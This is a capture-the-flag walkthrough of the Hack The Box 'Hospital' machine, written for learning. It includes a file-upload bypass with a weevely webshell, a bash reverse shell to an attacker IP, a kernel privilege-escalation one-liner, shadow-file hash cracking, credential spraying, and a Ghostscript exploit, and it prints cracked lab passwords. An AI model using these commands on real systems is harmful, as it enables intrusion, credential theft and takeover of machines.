# [Hospital](https://app.hackthebox.com/machines/hospital)

```bash
nmap -p- --min-rate 10000 10.10.11.241 -Pn
```

![alt text](img/image.png)


With chaning rate (5000), I got new port which is `8080`.

```bash
nmap -p- --min-rate 5000 10.10.11.241 -Pn
```

![alt text](img/image-1.png)

After detection of open ports, let's do greater nmap scan for ports which sounds tricky.

```bash
nmap -A -sC -sV -p53,88,135,139,389,443,445,3389,8080 10.10.11.241 -Pn
```

![alt text](img/image-5.png)



I see `Roundcube Webmail` for port `443`.

![alt text](img/image-2.png)


I see some application for port `8080`.

![alt text](img/image-3.png)


Let's create account and fuzz features of this application.

Once we open `dashboard`, we see `upload` functionality.

![alt text](img/image-4.png)


Let's try to do `File Upload Vulnerability`.


I tried to upload `.php` webshell and it failed.

![alt text](img/image-6.png)


Let's fuzz extensions from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and `.phar` type worked.

![alt text](img/image-7.png)


But I cannot see any output from my webshell execution.

![alt text](img/image-8.png)


Let's upload webshell via `.phar` extension by using `weevely` command.

First, we need to genereate webshell as below.
```bash
weevely generate dr4ks dr4ks.phar
```

![alt text](img/image-10.png)

Second, we need to upload this `dr4ks.phar` file into machine and run below command.

```bash
weevely http://10.10.11.241:8080/uploads/dr4ks.phar dr4ks
```

![alt text](img/image-9.png)


Let's add our reverse shell payload into here.
```bash
bash -c "bash -i >& /dev/tcp/10.10.14.2/1337 0>&1"
```

![alt text](img/image-11.png)


Hola, I got reverse shell from port `1337`.

![alt text](img/image-12.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo;fg
export TERM=xterm
export SHELL=bash
```

![alt text](img/image-13.png)


Let's run `uname -a` to learn kernel's version.

![alt text](img/image-14.png)


I searched this kernel's version and find publicly known exploit whose id is [CVE-2023-2640](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

I run exploit code as below.

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; bash")'
```

![alt text](img/image-15.png)


I am already root on `webserver`.


I just look at `/etc/shadow` to learn passwords of users.

![alt text](img/image-16.png)


Let's try to crack hash of `drwilliams` user via `hashcat`.

```bash
hashcat -m 1800 hash.txt --wordlist /usr/share/wordlists/rockyou.txt
```

![alt text](img/image-17.png)


drwilliams: qwe123!@#


Let's check this credentials against our target's `SMB` and `Winrm` via `crackmapexec`.
```bash
crackmapexec smb 10.10.11.241 -u "drwilliams" -p 'qwe123!@#'
crackmapexec winrm 10.10.11.241 -u "drwilliams" -p 'qwe123!@#'
```

![alt text](img/image-18.png)


Let's enumerate shares also via `smbmap` command.
```bash
smbmap -H 10.10.11.241 -u drwilliams -p'qwe123!@#'
```

![alt text](img/image-19.png)


Let's try to use credentials against `Roundcube` and it worked.

![alt text](img/image-20.png)


There's email in inbox about `Ghostscript` and I searched publicly known exploit for this software and find already.

![alt text](img/image-21.png)

That's [CVE-2023-36664](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection), let's use this.

```bash
python CVE_2023_36664_exploit.py --generate --filename needle --extension eps --payload "{powershell_base64_encoded_payload}"
```

![alt text](img/image-22.png)


Let's use this exploit.

![alt text](img/image-23.png)



Now, it's time to attach this maliicous file.

![alt text](img/image-24.png)


I got reverse shell from port `443`.

![alt text](img/image-25.png)


user.txt

![alt text](img/image-26.png)


While enumeration on machine, I find `ghostscript.bat` file on folder `C:\Users\drbrown.HOSPITAL\Documents` which contains sensitive credentials.

![alt text](img/image-27.png)


drbrown: chr!$br0wn


Let's check this credentials against SMB,WinRM via `crackmapexec`.

```bash
crackmapexec smb 10.10.11.241 -u "drbrown" -p 'chr!$br0wn'
crackmapexec winrm 10.10.11.241 -u "drbrown" -p 'chr!$br0wn'
```

![alt text](img/image-28.png)


Let's connect into machine via `evil-winrm`.

```bash
evil-winrm -i 10.10.11.241 -u "drbrown" -p 'chr!$br0wn'
```

![alt text](img/image-29.png)


While enumeration, I see that I have full privilege to `xampp` folder.

![alt text](img/image-30.png)


Let's upload php webshell into here and execute to learn what user is running, imp it is `administrator`.

I upload into `C:/xampp/htdocs` where `index.php` shows that `Roundcube` is used.

![alt text](img/image-31.png)


Let's browse this webshell.

![alt text](img/image-32.png)


Let's add our `powershell` reverse shell payload and `URL Encoding` to your payload.

![alt text](img/image-33.png)



Hola I got reverse shell from port `2024`.

![alt text](img/image-34.png)

root.txt

![alt text](img/image-35.png)